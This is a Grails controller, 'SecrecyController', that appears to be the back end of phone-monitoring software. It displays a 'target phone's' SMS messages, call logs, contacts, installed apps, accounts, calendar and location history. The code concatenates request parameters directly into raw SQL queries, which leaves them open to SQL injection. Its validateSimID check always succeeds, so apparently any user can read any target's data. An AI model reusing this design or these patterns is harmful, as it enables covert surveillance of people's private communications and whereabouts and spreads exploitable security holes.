package com.atlancy

import grails.converters.JSON

import java.sql.Timestamp

import org.apache.shiro.SecurityUtils

import com.atlancy.domain.Account
import com.atlancy.domain.CallLog
import com.atlancy.domain.Contact
import com.atlancy.domain.Location
import com.atlancy.domain.Package
import com.atlancy.domain.Sms
import com.atlancy.domain.TargetPhone
import com.atlancy.domain.User
import com.atlancy.domain.UserCalendar

class SecrecyController {

	def sessionFactory;
	def dataSource;
	def userService;

	//sms table and chat style by number and target phone
	def sms(){
		String number = params.number;
		def results = null;
		def contact =null;
		def owner = null;
		def isAll = false;
		def totalSize=0;
		def colSortName='';
		println params.contactId;
		TargetPhone currentTargetPhone = getTargetPhone(params);

		if(params.renderType!="table"){
			if(!"*all".equals(params.number)){
				def smsCriteria = Sms.createCriteria()
				results = smsCriteria.list{
					and {
						eq("address", params.number)
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("time","desc")
				}

				def contactCriteria = Contact.createCriteria()
				contact = contactCriteria.list{
					and {
						eq("id",Long.parseLong(params.contactId))
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
			}else{
				isAll = true;
				def session = sessionFactory.currentSession
				def query = session.createSQLQuery("select * from sms t1 left join contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ currentTargetPhone.simSubscriberId +"' group by t1.time order by t1.time asc");
				query.addEntity(com.atlancy.domain.Sms.class);
				query.addEntity(com.atlancy.domain.Contact.class); // this defines the result type of the query
				results=query.list();
			}
			render(template:"sms",model:[isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal: results!=null ? results.size():0]);
		}else{
			colSortName="time";
			switch(params.iSortCol_0){
				case "0":colSortName="folderName";break;
				case "1":colSortName="folderName";break;
				case "2":colSortName="msg";break;
				case "3":colSortName="time";break;
			}
			if(!"*all".equals(params.number)){
				def smsCriteria = Sms.createCriteria();
				results = smsCriteria.list (offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
					and {
						eq("address", params.number)
						like("msg","%" + params.sSearch + "%")
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order(colSortName, params.sSortDir_0)
				}

				def allSmsCriteria = Sms.createCriteria()
				def allSms = allSmsCriteria.list{
					and {
						eq("address", params.number)
						like('msg',"%" + params.sSearch + "%")
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
				totalSize = allSms!=null ? allSms.size():0;

				def contactCriteria = Contact.createCriteria()
				contact = contactCriteria.list{
					and {
						//eq("id",Long.parseLong(params.contactId))
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
			}else{
				if(params.iDisplayLength!="-1"){
					def allSmsCriteria = Sms.createCriteria();
					def allSms = allSmsCriteria.list{
						and {
							targetPhone{
								eq("simSubscriberId", currentTargetPhone.simSubscriberId)
							}
						}
					}
					totalSize = allSms!=null ? allSms.size():0;

					isAll = true;
					def session = sessionFactory.currentSession
					def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ params.simSubscriberId +"' group by t1.time order by t1.time asc LIMIT " + params.iDisplayStart + ", "+ params.iDisplayLength);
					query.addEntity(com.atlancy.domain.Sms.class);// this defines the result type of the query
					query.addEntity(com.atlancy.domain.Contact.class); // this defines the result type of the query
					if(query!=null){
						results=query.list();
					}
				}
			}
			render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal:totalSize]};
		}
		return
	}

	//call logs by number and target phone
	def callLog(){
		def callLogs=null;
		def colSortName='';
		def totalSize=0;

		TargetPhone currentTargetPhone = getTargetPhone(params);

		if(!"*all".equals(params.number)){
			switch(params.iSortCol_0){
				case "0":colSortName="type";break;
				case "1":colSortName="type";break;
				case "2":colSortName="duration";break;
				case "3":colSortName="timeSeconds";break;
			}
			def callLogsCriteria = CallLog.createCriteria();
			callLogs = callLogsCriteria.list (cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
				and {
					eq("phoneNumber", params.number)
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order(colSortName, params.sSortDir_0)
			}

			def allCallLogsCriteria = CallLog.createCriteria();
			def allCallLogs = allCallLogsCriteria.list{
				and {
					eq("phoneNumber", params.number)
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
			}
			totalSize = allCallLogs!=null ? allCallLogs.size():0;
		}else{
			def callLogsCriteria = CallLog.createCriteria();
			callLogs = callLogsCriteria.list(cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)){
				and {
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order("timeSeconds","desc")
			}

			def allCallLogsCriteria = CallLog.createCriteria();
			def allCallLogs = allCallLogsCriteria.list{
				and {
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
			}


			totalSize = allCallLogs!=null ? allCallLogs.size():0;
		}
		render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,callLogInstanceList:callLogs]}
	}

	private getTargetPhone(Map params) {
		String simSubscriberId = params.simSubscriberId;
		def username  = SecurityUtils.subject?.principal
		User user = User.findByUsername(username);

		def targetPhones = user.targetPhones;
		TargetPhone targetPhone = null;

		if(!validateSimID(simSubscriberId,targetPhones)){
			log.info "invalue target phone for this user."
			flash.message = "invalue target phone for this user.";
			return
		}else{
			targetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);

			return targetPhone;
		}
	}

	//all contacts by target phone
	def contacts(){

		TargetPhone currentTargetPhone = getTargetPhone(params);

		def contactsCriteria = Contact.createCriteria();
		def contacts = contactsCriteria.list{
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order("name", "asc")
		}
		render(template:"contacts",model:[contactInstanceList: contacts, contactInstanceTotal: contacts!=null ? contacts.size():0]);
		return
	}

	def packages(){
		TargetPhone currentTargetPhone = getTargetPhone(params);

		def packagesCriteria = Package.createCriteria();
		def packages = packagesCriteria.list{
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order("appname", "asc")
		}
		render(template:"packages",model:[packageInstanceList: packages, packageInstanceTotal: packages!=null ? packages.size():0]);
		return
	}


	def accounts(){
		TargetPhone currentTargetPhone = getTargetPhone(params);

		def accountsCriteria = Account.createCriteria();
		def accounts = accountsCriteria.list{
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order("accountName", "asc")
		}
		render(template:"accounts",model:[accountInstanceList: accounts, accountInstanceTotal: accounts!=null ? accounts.size():0]);
		return
	}


	def userCalendar(){
		TargetPhone currentTargetPhone = getTargetPhone(params);
		//log.error params.start;
		def userCalendarCriteria = UserCalendar.createCriteria();

		def userCalendarEntries = userCalendarCriteria.list{
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
				or{
					between("start",new Timestamp(Long.valueOf(params.start)* 1000),new Timestamp(Long.valueOf(params.end)* 1000))
					like("rule","%FREQ=YEARLY%")
					like("rule","%FREQ=MONTHLY%")
				}
			}
		}

		Timestamp start = new Timestamp(Long.valueOf(params.start)* 1000 + (14 * 24 * 3600)*1000);

		for(UserCalendar obj:userCalendarEntries){
			if(obj.getRule()){
				if(obj.getRule().startsWith("FREQ=YEARLY")){
					obj.getStart().setYear(start.getYear());
					obj.setClassName("yearly_event");
				}else if(obj.getRule().startsWith("FREQ=MONTHLY")){
					obj.getStart().setYear(start.getYear());
					obj.getStart().setMonth(start.getMonth());
					obj.setClassName("monthly_event");
				}
				obj.discard();
			}
		}

		render userCalendarEntries as JSON
	}

	def dashboard() {
		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);
		[user:currentUser]
	}

	def timeline() {
		println "here"
	}

	def index2() {
		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);
		[user:currentUser]
	}

	def index() {
		String simSubscriberId = params.simSubscriberId;

		def scrollTo = null;
		def smss,callLogs,locations,contacts,allLocations;

		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);

		def targetPhoneCriteria = TargetPhone.createCriteria()
		def targetPhones = targetPhoneCriteria.list{
			and {
				user{
					eq("username", currentUser.username)
				}
			}
			order("alias", "asc")
		}

		TargetPhone currentTargetPhone = null;
		List<String> subscribersList = new ArrayList<String>();

		if(targetPhones!=null && !targetPhones.isEmpty()){
			if(simSubscriberId!=null && !simSubscriberId.isEmpty()){
				if(!validateSimID(simSubscriberId,targetPhones)){
					log.info "invalue target phone for this user."
					flash.message = "invalue target phone for this user.";
					return
				}else{
					currentTargetPhone = TargetPhone.findBySimSubscriberId(simSubscriberId);
				}
			}else{
				currentTargetPhone = targetPhones.first();
				params.simSubscriberId = simSubscriberId = currentTargetPhone.simSubscriberId;
			}

			//contacts
			def contactCriteria = Contact.createCriteria()
			contacts = contactCriteria.list{
				and {
					targetPhone{
						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
					}
				}
				order("name", "asc")
			}

			if(contacts!=null && contacts.size()>0){
				Contact defaultContact = contacts.get(0);
				String defaultNumber = null;//defaultContact.number;

				//			//call logs
				//			def callLogCriteria = CallLog.createCriteria()
				//			callLogs = callLogCriteria.list(offset:0,max:5) {
				//				and {
				//					if(defaultNumber!=null){
				//						eq("phoneNumber", defaultNumber)
				//					}
				//					targetPhone{
				//						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				//					}
				//				}
				//				order("timeSeconds","desc")
				//			}
				//
				//			//smses
				//			def smsCriteria = Sms.createCriteria()
				//			smss = smsCriteria.list(offset:0,max:5) {
				//				and {
				//					if(defaultNumber!=null){
				//						eq("address", defaultNumber)
				//					}
				//					targetPhone{
				//						eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				//					}
				//				}
				//				order("time","desc")
				//			}

				// locations
				def locationCriteria = Location.createCriteria()
				locations = locationCriteria.list (offset:0,max:5) {
					and {
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
					order("time", "desc")
				}

				def allLocationsCriteria = Location.createCriteria()
				allLocations = allLocationsCriteria.list {
					and {
						targetPhone{
							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
						}
					}
				}
			}
		}
		[currentTargetPhone:currentTargetPhone,
			activeSimSubscriberId:simSubscriberId,
			targetPhoneInstanceList:targetPhones.size()>0 ? targetPhones:null,
			user:currentUser,
			scrollToID:scrollTo,
			contactInstanceList: contacts,
			contactInstanceTotal: contacts!=null ? contacts.size():0,
			//smsInstanceTotal: smss!=null ? smss.size():0,
			//callLogsInstanceTotal: callLogs!=null ? callLogs.size():0,
			locationInstanceList:locations as JSON,
			locationInstanceTotal: locations!=null ? locations.size():0,
			allLocations:allLocations as JSON,
			allLocationsTotal: allLocations!=null ? allLocations.size():0]
	}

	def lockme() {
		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);
		[user:currentUser]
	}

	def validateSimID(String simSubscriberId,def targetPhones){
		return targetPhones.findAll{["simSubscriberId":simSubscriberId]};
	}

	def icons(){
	}

	def location(){
		def colSortName='';

		TargetPhone currentTargetPhone = getTargetPhone(params);

		switch(params.iSortCol_0){
			case "0":colSortName="id";break;
			case "1":colSortName="address";break;
			case "2":colSortName="time";break;
		}

		def locationsCriteria = Location.createCriteria()
		def locations = locationsCriteria.list (cache: true,offset:Long.parseLong(params.iDisplayStart),max:Long.parseLong(params.iDisplayLength)) {
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
			order(colSortName, params.sSortDir_0)
		}

		def allLocationsCriteria = Location.createCriteria()
		def allLocations = allLocationsCriteria.list {
			and {
				targetPhone{
					eq("simSubscriberId", currentTargetPhone.simSubscriberId)
				}
			}
		}

		def totalSize = (allLocations!=null ? allLocations.size():0);
		render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,locationInstanceList:locations]}
	}


	def profile(){
		def username  = SecurityUtils.subject?.principal
		User currentUser = User.findByUsername(username);
		[user:currentUser]
	}

	def updateUserDetails(){
		try{
			def username  = SecurityUtils.subject?.principal
			User currentUser = User.findByUsername(username);

			currentUser.firstName= params.firstName;
			currentUser.lastName= params.lastName;
			currentUser.birthDate= new Date(params.birthDate);
			currentUser.occupation= params.occupation;
			currentUser.email= params.email;
			currentUser.number= params.number;
			currentUser.type= params.type;
			currentUser.country= params.country;
			currentUser.more= params.more;
			currentUser.siteURL= params.siteURL;
			currentUser.address= params.address;

			userService.updateUserDetails(currentUser);
			flash.message = "הנתונים נשמרו בהצלחה.";
			[error:false]
		}catch(Exception e){
			flash.message = "הנתונים לא נשמרו.";
			[error:true]
		}
	}

	def headerNavigation(){
		//render "header-navigation";
	}

}
